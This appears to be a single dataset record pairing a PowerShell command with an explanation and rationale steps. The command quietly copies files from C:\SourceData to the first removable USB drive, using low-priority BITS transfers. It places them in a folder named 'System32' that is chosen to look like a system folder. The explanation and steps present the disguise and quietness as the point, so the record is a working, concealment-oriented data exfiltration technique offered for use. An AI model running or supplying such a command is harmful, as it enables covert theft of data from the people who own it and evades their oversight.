command: $dl=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | Select-Object -First 1 -ExpandProperty DriveLetter); New-Item -Path "$dl:\System32" -ItemType Directory -Force | Out-Null; Start-BitsTransfer -Source "C:\SourceData\*" -Destination "$dl:\System32" -Priority Low
explanation: Uses BITS to transfer local files quietly to a system-sounding folder on a USB device, keeping activity local and resilient.
rationale_steps: Create a plausible destination folder on the USB.
Use BITS to copy local files to the removable device.
